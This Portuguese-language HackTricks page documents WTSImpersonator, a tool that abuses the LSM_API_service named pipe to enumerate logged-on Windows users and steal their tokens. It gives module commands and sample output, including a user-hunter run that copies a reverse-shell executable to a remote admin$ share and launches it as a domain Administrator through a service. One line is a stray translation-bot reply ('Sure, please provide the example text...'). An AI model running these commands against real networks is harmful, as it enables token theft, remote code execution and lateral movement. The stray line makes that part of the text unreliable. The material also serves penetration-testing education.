<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

WTS Impersonator explora o pipe nomeado RPC “**\\pipe\LSM_API_service**” para enumerar usuários logados e roubar tokens de outros usuários sem usar a técnica normal de "Impersonation de Token", permitindo movimento lateral fácil e discreto. Essa técnica foi pesquisada e desenvolvida por [Omri Baso](https://www.linkedin.com/in/omri-baso/).

A ferramenta `WTSImpersonator` pode ser encontrada no [github](https://github.com/OmriBaso/WTSImpersonator).
```
WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> CreateProcessAsUserW
```
#### Módulo `enum`:

Enumera Usuários Locais na máquina em que a ferramenta está sendo executada
```powershell
.\WTSImpersonator.exe -m enum
```
Enumerar uma máquina remotamente dado um IP ou um Hostname.
```powershell  
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```
#### Módulo `exec` / `exec-remote`:
Tanto "exec" quanto "exec-remote" requerem estar em um contexto de **"Serviço"**.
O módulo local "exec" não precisa de nada além do WTSImpersonator.exe e do binário que você deseja executar \(-c flag\), isso poderia ser
um normal "C:\\Windows\\System32\\cmd.exe" e você abrirá um CMD como o usuário desejado, um exemplo seria
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
você poderia usar PsExec64.exe para obter um contexto de serviço
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```
Para `exec-remote`, as coisas são um pouco diferentes, eu criei um serviço que pode ser instalado remotamente, assim como `PsExec.exe`
o serviço receberá um `SessionId` e um `binário para executar` como argumento e será instalado e executado remotamente, dado as permissões corretas
um exemplo de execução seria o seguinte:
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso
WTSEnumerateSessions count: 1
[2] SessionId: 2 State: WTSDisconnected (4) WinstationName: ''
WTSUserName:  Administrator
WTSDomainName: LABS
WTSConnectState: 4 (WTSDisconnected)
```
como pode ser visto acima, o `Sessionid` da conta de Administrador é `2`, então o usamos a seguir na variável `id` ao executar código remotamente
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```
#### Módulo `user-hunter`:

O módulo user hunter permite enumerar múltiplas máquinas e, se um determinado usuário for encontrado, executará código em nome deste usuário.
Isso é útil ao procurar por "Domain Admins" quando se tem direitos de administrador local em algumas máquinas.
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
Sure, please provide the example text you would like translated.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso

[+] Hunting for: LABS/Administrator On list: .\test.txt
[-] Trying: 192.168.40.131
[+] Opned WTS Handle: 192.168.40.131
[-] Trying: 192.168.40.129
[+] Opned WTS Handle: 192.168.40.129

----------------------------------------
[+] Found User: LABS/Administrator On Server: 192.168.40.129
[+] Getting Code Execution as: LABS/Administrator
[+] Trying to execute remotly
[+] Transfering file remotely from: .\WTSService.exe To: \\192.168.40.129\admin$\voli.exe
[+] Transfering file remotely from: .\SimpleReverseShellExample.exe To: \\192.168.40.129\admin$\DrkSIM.exe
[+] Successfully transfered file!
[+] Successfully transfered file!
[+] Sucessfully Transferred Both Files
[+] Will Create Service voli
[+] Create Service Success : "C:\Windows\voli.exe" 2 C:\Windows\DrkSIM.exe
[+] OpenService Success!
[+] Started Sevice Sucessfully!

[+] Deleted Service
```

